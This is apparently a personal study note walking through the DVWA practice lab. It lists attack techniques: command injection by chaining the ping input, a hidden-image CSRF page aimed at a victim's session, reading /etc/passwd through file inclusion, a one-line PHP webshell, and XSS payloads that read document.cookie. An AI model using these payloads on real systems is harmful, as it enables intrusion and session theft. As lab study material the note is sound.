---
tags:
  - "#type/note"
---
# DVWA - Damn Vulnerable Web Application

## Brute Force

brute force with burp cluster bomb

## Command Execution

end ping command with ; | or && and then enter another command

## CSRF - Cross Site Request Forgery

1. get request in burp
2. write proof of concept script

```html
<html>
	<head>
		<title>CSRF Proof of Concept</title>
	</head>
	<body>
		<h1>CSRF Example</h1>
		<img style="display:none" src="ENTER THE FORGED REQUEST HERE" alt="">
	</body>
</html>
```

usually you do a 1:1 copy of the webpage and insert this snippet with a hidden image

1. in the hidden image src part you enter the request you want to be sent
2. you present the malicious site to some user - the request will be sent using his session ID -> you might be able to change credentials, retrieve information,...

## Insecure Captcha

doesnt work anymore

## File Inclusion

change page parameter in request to some file like /etc/passwd

can you include a remote file?

## SQL Injection

[[2 Tech-Specifics/Web/Attacks - Web/Injection Attacks/SQL Injection]]

## Upload Vulns

upload a simple php webshell

```php
<?php
	system($GET["cmd"]);
?>
```

then send request to this file on the webserver and pass a command in cmd parameter

## XSS

enter a script tag

```html
<script>alert();</script>
```

```html
<script>alert(document.cookie);</script>
```
